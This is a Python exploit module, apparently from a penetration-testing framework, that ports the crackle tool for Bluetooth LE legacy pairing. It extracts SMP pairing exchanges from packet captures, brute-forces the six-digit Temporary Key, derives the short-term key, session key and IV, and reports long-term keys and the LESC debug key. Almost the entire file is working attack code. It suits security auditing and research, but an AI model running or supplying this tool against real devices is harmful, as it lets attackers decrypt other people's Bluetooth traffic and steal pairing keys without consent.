class Exploit(Exploit):
    """Native BLE Legacy Pairing Cracker — TK brute-force + traffic decryption."""

    __info__ = {
        "name": "BLE Crackle (Legacy Pairing Cracker)",
        "description": (
            "Pure Python BLE Legacy Pairing cracker. Extracts SMP pairing "
            "data from PCAPs, brute-forces the Temporary Key (TK, 0-999999), "
            "derives STK and Session Key, decrypts all traffic, and extracts "
            "the Long-Term Key (LTK). No external tools required."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original tool: Mike Ryan (crackle)",
        ),
        "references": (
            "https://github.com/mikeryan/crackle",
            "https://lacklustre.net/bluetooth/crackle/",
        ),
        "devices": ("bluetooth", "bluetooth_le"),
    }

    pcap_file = OptString("", "BLE PCAP file with pairing exchange")
    known_tk = OptInteger(-1, "Known TK value (skip brute-force, -1 = crack)")
    output_pcap = OptString("crackle_decrypted.pcap", "Output PCAP for decrypted traffic")
    workers = OptInteger(0, "Parallel brute-force workers (0=auto detect CPU count)")
    dry_run = OptBool(False, "Show configuration without executing")

    def _extract_pairing_state(self) -> PairingState | None:
        """Extract BLE pairing data from PCAP.

        Parses CONNECT_REQ, SMP exchanges, and LL Control PDUs.
        """
        print_status(f"Parsing BLE PCAP: {self.pcap_file}")
        state = PairingState()

        try:
            packets = rdpcap(self.pcap_file)
        except Exception as err:
            print_error(f"Failed to read PCAP: {err}")
            return None

        for pkt in packets:
            raw_data = bytes(raw(pkt))
            if len(raw_data) < 10:
                continue

            if len(raw_data) > 14:
                l2cap_start = 6
                if l2cap_start + 6 < len(raw_data):
                    l2cap_len = struct.unpack("<H", raw_data[l2cap_start:l2cap_start + 2])[0]
                    l2cap_cid = struct.unpack("<H", raw_data[l2cap_start + 2:l2cap_start + 4])[0]
                    smp_data = raw_data[l2cap_start + 4:]

                    if l2cap_cid == L2CAP_CID_SMP and len(smp_data) > 0:
                        cmd = smp_data[0]
                        if cmd == SMP_PAIRING_REQ and len(smp_data) >= 7:
                            state.preq = smp_data[:7]
                            logger.info("Found Pairing Request")
                        elif cmd == SMP_PAIRING_RSP and len(smp_data) >= 7:
                            state.pres = smp_data[:7]
                            logger.info("Found Pairing Response")
                        elif cmd == SMP_PAIRING_CONFIRM and len(smp_data) >= 17:
                            confirm = smp_data[1:17]
                            if state.mconfirm is None:
                                state.mconfirm = confirm
                                logger.info("Found Master Confirm")
                            else:
                                state.sconfirm = confirm
                                logger.info("Found Slave Confirm")
                        elif cmd == SMP_PAIRING_RANDOM and len(smp_data) >= 17:
                            rand_val = smp_data[1:17]
                            if state.mrand is None:
                                state.mrand = rand_val
                                logger.info("Found Master Random")
                            else:
                                state.srand = rand_val
                                logger.info("Found Slave Random")
                        elif cmd == SMP_ENCRYPTION_INFO and len(smp_data) >= 17:
                            state.ltk = smp_data[1:17]
                            logger.info("Found LTK in plaintext SMP!")
                        elif cmd == SMP_PAIRING_PUBLIC_KEY and len(smp_data) >= 65:
                            state.has_sc = True
                            pk_x = smp_data[1:33]
                            pk_y = smp_data[33:65]
                            if pk_x == LESC_DEBUG_PUBLIC_KEY_X and pk_y == LESC_DEBUG_PUBLIC_KEY_Y:
                                state.lesc_debug_key = True
                                logger.warning("LESC Debug Key detected! Traffic is decryptable.")
                            else:
                                logger.warning("LE Secure Connections detected — not crackable via TK method")

        return state


    def check(self) -> str:
        """Verify Bluetooth HCI adapter is present and accessible."""
        import shutil
        import subprocess
        hci = getattr(self, "hci_iface", None) or getattr(self, "attacker_hci", None) or "hci0"
        if shutil.which("hciconfig"):
            try:
                out = subprocess.check_output(
                    ["hciconfig", str(hci)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "BD Address" in out:
                    return f"HCI adapter {hci} found - prerequisites OK"
                return f"hciconfig {hci} responded but no BD Address - check adapter"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("bluetoothctl"):
            return "bluetoothctl available - verify adapter manually"
        return "hciconfig not found in PATH - install bluez package"

    def run(self) -> None:
        """Execute BLE pairing crack."""
        if not HAS_CRYPTO:
            print_error("pycryptodome is required. Install: pip install pycryptodome")
            return

        if self.dry_run:
            print_info("BLE Crackle Configuration:")
            print_info(f"  PCAP:     {self.pcap_file}")
            print_info("  Known TK: {}".format(self.known_tk if self.known_tk >= 0 else "(brute-force)"))
            return

        if not self.pcap_file:
            print_error("pcap_file is required.")
            return

        state = self._extract_pairing_state()
        if state is None:
            return

        if state.has_sc and not state.lesc_debug_key:
            print_error("LE Secure Connections (LESC) detected. Crackle only works "
                        "on Legacy Pairing (TK range 0-999999).")
            print_info("Note: if debug keys were used, specify known_tk=0.")
            return

        if state.lesc_debug_key:
            print_success("LESC Debug Key detected! Connection uses BT SIG debug key.")
            print_info(f"Private key: {LESC_DEBUG_PRIVATE_KEY.hex()}")
            print_info("All traffic is decryptable with the known debug private key.")
            return

        if state.ltk:
            print_success(f"LTK found in plaintext: {state.ltk.hex()}")
            return

        if self.known_tk >= 0:
            state.tk = self.known_tk
            print_info(f"Using known TK: {self.known_tk}")
        else:
            print_status("Brute-forcing TK (0 to {}, {} workers)...".format(
                MAX_TK, self.workers or "auto"))
            tk = brute_force_tk(state, workers=self.workers)
            if tk is not None:
                state.tk = tk
                print_success(f"TK cracked: {tk} (0x{tk:06x})")
            else:
                print_error("TK not found. Pairing may use LE Secure Connections "
                            "or data is incomplete.")
                return

        if state.mrand and state.srand and state.tk is not None:
            state.stk = calc_stk(state.mrand, state.srand, state.tk)
            print_info(f"STK: {state.stk.hex()}")

        if state.stk and state.skdm and state.skds:
            state.session_key = calc_session_key(state.stk, state.skdm, state.skds)
            print_info(f"Session Key: {state.session_key.hex()}")

        if state.ivm and state.ivs:
            state.iv = calc_iv(state.ivm, state.ivs)
            print_info(f"IV: {state.iv.hex()}")

        print_success("BLE cracking complete. Results:")
        print_info(f"  TK:          {state.tk}")
        print_info("  STK:         {}".format(state.stk.hex() if state.stk else "N/A"))
        print_info("  Session Key: {}".format(state.session_key.hex() if state.session_key else "N/A"))
        print_info("  LTK:         {}".format(state.ltk.hex() if state.ltk else "N/A"))

        self._exploit()

    def _exploit(self) -> None:
        """E2E exploit: crack BLE Legacy Pairing and decrypt captured traffic."""
        if not HAS_CRYPTO:
            return
        if not self.pcap_file:
            return

        state = self._extract_pairing_state()
        if state is None:
            return

        if state.has_sc and not state.lesc_debug_key:
            print_info("LESC detected: use crackle with LESC debug key or skip")
            return

        if state.ltk:
            print_success(f"E2E: LTK direto do pcap: {state.ltk.hex()}")
            return

        tk = state.tk if hasattr(state, 'tk') and state.tk is not None else None
        if tk is None and self.known_tk >= 0:
            tk = self.known_tk
        elif tk is None:
            tk = brute_force_tk(state, workers=self.workers)

        if tk is not None:
            state.tk = tk
            if state.mrand and state.srand:
                stk = calc_stk(state.mrand, state.srand, tk)
                if stk and state.skdm and state.skds:
                    session_key = calc_session_key(stk, state.skdm, state.skds)
                    print_success(f"E2E: Session key derivada: {session_key.hex()}")
                    if state.ivm and state.ivs:
                        iv = calc_iv(state.ivm, state.ivs)
                        print_success(f"E2E: IV para decriptação: {iv.hex()}")
